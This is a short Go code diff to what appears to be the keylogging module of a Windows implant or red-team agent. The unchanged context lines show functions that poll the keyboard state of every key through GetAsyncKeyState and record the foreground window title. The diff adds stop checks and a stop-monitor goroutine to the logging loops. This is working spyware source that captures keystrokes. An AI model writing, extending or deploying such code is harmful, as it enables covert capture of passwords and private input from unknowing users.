@@ -325,6 +325,9 @@ func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32,
 
 func windowLogger() {
 	for {
+		if *curTask.Job.Stop > 0 {
+			break
+		}
 		g, _ := getForegroundWindow()
 		b := make([]uint16, 200)
 		_, err := getWindowText(g, &b[0], int32(len(b)))
@@ -348,6 +351,9 @@ func windowLogger() {
 
 func keystateMonitor() {
 	for {
+		if *curTask.Job.Stop > 0 {
+			break
+		}
 		time.Sleep(1 * time.Millisecond)
 		for KEY := 0; KEY <= 256; KEY++ {
 			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
@@ -418,6 +424,7 @@ func keystateMonitor() {
 func keyLogger() error {
 	// Because we want to flush the buffer on each window change
 	// the windowLogger needs to know the channel to send messages to.
+	go curTask.Job.MonitorStop()
 	go windowLogger()
 	go keystateMonitor()
 	return nil
